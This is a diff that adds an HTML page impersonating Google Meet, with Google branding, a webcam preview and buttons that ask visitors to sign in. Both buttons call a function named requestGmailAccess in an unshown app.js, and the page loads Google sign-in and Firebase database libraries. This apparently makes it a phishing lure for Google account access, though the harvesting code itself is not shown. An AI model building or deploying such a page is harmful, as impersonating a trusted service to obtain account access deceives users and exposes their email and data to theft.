@@ -1,0 +1,577 @@
+
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Meet</title>
+  <link rel="icon" href="./asset/logoo.png">
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #f1f3f4;
+      color: #202124;
+      min-height: 100vh;
+    }
+
+    /* HEADER */
+
+    header {
+      height: 72px;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 32px;
+      box-shadow: 0 1px 2px rgba(60,64,67,0.15);
+    }
+
+    .logo-area {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 24px;
+      font-weight: 700;
+      color: #188038;
+    }
+
+    .logo-area img {
+      height: 36px;
+      width: auto;
+      border-radius: 4px;
+    }
+
+    .sign-in-btn {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 24px;
+      font-weight: 600;
+      font-size: 15px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .sign-in-btn:hover {
+      background: #1557b0;
+    }
+
+    /* MAIN */
+
+    main {
+      max-width: 1280px;
+      margin: auto;
+      padding: 40px 32px;
+      display: flex;
+      gap: 48px;
+      min-height: calc(100vh - 120px);
+      align-items: center;
+    }
+
+    /* CAMERA PREVIEW */
+
+    .video-preview {
+      flex: 1.4;
+      background: #202124;
+      border-radius: 16px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      aspect-ratio: 16 / 9;
+      width: 100%;
+    }
+
+    .video-preview video {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+    }
+
+    .video-preview::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(
+        180deg,
+        rgba(0,0,0,0.1),
+        transparent 45%,
+        rgba(0,0,0,0.65)
+      );
+      pointer-events: none;
+    }
+
+    .video-label {
+      color: #bdc1c6;
+      font-size: 16px;
+      z-index: 2;
+      text-align: center;
+      padding: 20px;
+    }
+
+    /* CAMERA CONTROLS */
+
+    .controls {
+      position: absolute;
+      bottom: 32px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 16px;
+      z-index: 3;
+    }
+
+    .ctrl-btn {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      border: none;
+      background: #ea4335;
+      color: #fff;
+      font-size: 22px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: 0.2s;
+    }
+
+    .ctrl-btn:hover {
+      transform: scale(1.08);
+      background: #d93025;
+    }
+
+    .ctrl-btn.off {
+      background: #5f6368;
+    }
+
+    /* RIGHT PANEL */
+
+    .join-panel {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      text-align: center;
+    }
+
+    .join-panel h1 {
+      font-size: 36px;
+      font-weight: 700;
+      color: #1a1a1a;
+      letter-spacing: -1.2px;
+      line-height: 1.2;
+    }
+
+    .join-panel p {
+      font-size: 15px;
+      line-height: 1.7;
+      color: #5f6368;
+      max-width: 380px;
+    }
+
+    /* CONNECT BUTTON */
+
+    .btn-join {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      width: 100%;
+      max-width: 360px;
+      padding: 16px 28px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 28px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 2px 6px rgba(26,115,232,0.35);
+      transition: 0.2s;
+    }
+
+    .btn-join:hover {
+      background: #1557b0;
+      box-shadow: 0 4px 12px rgba(26,115,232,0.45);
+      transform: translateY(-2px);
+    }
+
+    .btn-join:disabled {
+      opacity: 0.65;
+      cursor: not-allowed;
+    }
+
+    /* STATUS */
+
+    #status {
+      font-size: 14px;
+      font-weight: 500;
+      text-align: center;
+      min-height: 20px;
+    }
+
+    .success {
+      color: #545654;
+    }
+
+    .error {
+      color: #d93025;
+    }
+
+    /* FOOTER */
+
+    .footer-link {
+      padding: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #5f6368;
+    }
+
+    .footer-link a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+
+    /* MOBILE RESPONSIVE */
+
+    @media (max-width: 960px) {
+      main {
+        flex-direction: column;
+        padding: 24px;
+        gap: 35px;
+        min-height: auto;
+      }
+
+      .video-preview {
+        flex: none;
+        max-width: 650px;
+      }
+
+      .join-panel {
+        width: 100%;
+        max-width: 480px;
+      }
+
+      .join-panel h1 {
+        font-size: 30px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      header {
+        height: 64px;
+        padding: 0 16px;
+      }
+
+      .logo-area {
+        font-size: 20px;
+      }
+
+      .logo-area img {
+        height: 30px;
+      }
+
+      .sign-in-btn {
+        padding: 9px 17px;
+        font-size: 13px;
+      }
+
+      main {
+        padding: 20px 16px;
+        gap: 30px;
+      }
+
+      .video-preview {
+        border-radius: 12px;
+      }
+
+      .controls {
+        bottom: 15px;
+        gap: 12px;
+      }
+
+      .ctrl-btn {
+        width: 44px;
+        height: 44px;
+        font-size: 17px;
+      }
+
+      .join-panel h1 {
+        font-size: 27px;
+      }
+
+      .join-panel p {
+        font-size: 14px;
+      }
+
+      .btn-join {
+        padding: 15px 20px;
+      }
+    }
+  </style>
+
+  <!-- Google Identity Services -->
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
+
+  <!-- Firebase Compat -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+</head>
+
+<body>
+
+  <!-- HEADER -->
+
+  <header>
+    <div class="logo-area">
+      <img src="./asset/logoo.png" alt="Logo">
+      <span>Google Meet</span>
+    </div>
+
+    <button
+      class="sign-in-btn"
+      onclick="requestGmailAccess()">
+      Sign in
+    </button>
+  </header>
+
+  <!-- MAIN CONTENT -->
+
+  <main>
+
+    <!-- LEFT CAMERA SECTION -->
+
+    <section class="video-preview">
+
+      <video
+        id="camVideo"
+        autoplay
+        playsinline
+        muted>
+      </video>
+
+      <div class="video-label" id="videoLabel">
+        Your camera is turned off
+      </div>
+
+      <div class="controls">
+
+        <button
+          class="ctrl-btn off"
+          id="btnMic"
+          title="Microphone"
+          aria-label="Toggle microphone"
+          onclick="toggleMic()">
+          <i class="fa-solid fa-microphone-slash"></i>
+        </button>
+
+        <button
+          class="ctrl-btn off"
+          id="btnCam"
+          title="Camera"
+          aria-label="Toggle camera"
+          onclick="toggleCam()">
+          <i class="fa-solid fa-video-slash"></i>
+        </button>
+
+        <button
+          class="ctrl-btn"
+          title="Stop preview"
+          aria-label="Stop preview"
+          onclick="stopPreview()">
+          <i class="fa-solid fa-phone-slash"></i>
+        </button>
+
+      </div>
+
+    </section>
+
+    <!-- RIGHT CONNECT SECTION -->
+
+    <aside class="join-panel">
+   <div style="text-align: center; max-width: 400px; margin: 0 auto; font-family: system-ui, -apple-system, sans-serif;">
+  <h1 style="font-size: 22px; font-weight: 700; color: #111827; margin: 0 0 6px 0;">
+    Welcome to the Google Meet
+  </h1>
+  <p style="font-size: 14px; color: #6B7280; line-height: 1.5; margin: 0;">
+    First time here? Please sign in to securely access your meeting room.
+  </p>
+</div>
+
+      <button
+        class="btn-join"
+        id="connectBtn"
+        onclick="requestGmailAccess()">
+
+        <i class="fa-brands fa-google"></i>
+
+        <span>Ask To join</span>
+
+      </button>
+
+      <div id="status" role="status" aria-live="polite"></div>
+
+    </aside>
+
+  </main>
+
+  <!-- FOOTER -->
+
+  <div class="footer-link">
+    <a href="#">
+      Learn more about joining and terms
+    </a>
+  </div>
+
+  <!-- CAMERA SCRIPT -->
+
+  <script>
+    const videoEl = document.getElementById("camVideo");
+    const videoLabel = document.getElementById("videoLabel");
+    const btnMic = document.getElementById("btnMic");
+    const btnCam = document.getElementById("btnCam");
+
+    let stream = null;
+
+    async function initCamera() {
+      if (!navigator.mediaDevices?.getUserMedia) {
+        videoLabel.textContent =
+          "Camera requires HTTPS or localhost";
+        return;
+      }
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: true
+        });
+
+        videoEl.srcObject = stream;
+
+        videoLabel.style.display = "none";
+
+        updateControls();
+
+      } catch (error) {
+        console.error("Camera Error:", error);
+
+        videoLabel.textContent =
+          "Camera/Microphone permission required";
+
+        videoLabel.style.display = "block";
+      }
+    }
+
+    function updateControls() {
+      if (!stream) return;
+
+      const audioTrack = stream.getAudioTracks()[0];
+      const videoTrack = stream.getVideoTracks()[0];
+
+      if (audioTrack) {
+        btnMic.querySelector("i").className =
+          audioTrack.enabled
+          ? "fa-solid fa-microphone"
+          : "fa-solid fa-microphone-slash";
+
+        btnMic.classList.toggle("off", !audioTrack.enabled);
+      }
+
+      if (videoTrack) {
+        btnCam.querySelector("i").className =
+          videoTrack.enabled
+          ? "fa-solid fa-video"
+          : "fa-solid fa-video-slash";
+
+        btnCam.classList.toggle("off", !videoTrack.enabled);
+
+        videoLabel.style.display =
+          videoTrack.enabled ? "none" : "block";
+
+        videoLabel.textContent =
+          "Your camera is turned off";
+      }
+    }
+
+    async function toggleCam() {
+      if (!stream) {
+        await initCamera();
+        return;
+      }
+
+      const track = stream.getVideoTracks()[0];
+
+      if (!track) return;
+
+      track.enabled = !track.enabled;
+
+      updateControls();
+    }
+
+    async function toggleMic() {
+      if (!stream) {
+        await initCamera();
+        return;
+      }
+
+      const track = stream.getAudioTracks()[0];
+
+      if (!track) return;
+
+      track.enabled = !track.enabled;
+
+      updateControls();
+    }
+
+    function stopPreview() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+
+      videoEl.srcObject = null;
+
+      videoLabel.textContent =
+        "Your camera is turned off";
+
+      videoLabel.style.display = "block";
+
+      btnMic.classList.add("off");
+      btnCam.classList.add("off");
+
+      btnMic.querySelector("i").className =
+        "fa-solid fa-microphone-slash";
+
+      btnCam.querySelector("i").className =
+        "fa-solid fa-video-slash";
+    }
+
+    // Camera starts only when the user clicks a control.
+  </script>
+
+  <!-- EXISTING GOOGLE AUTH LOGIC -->
+
+  <script src="app.js"></script>
+
+</body>
+</html>
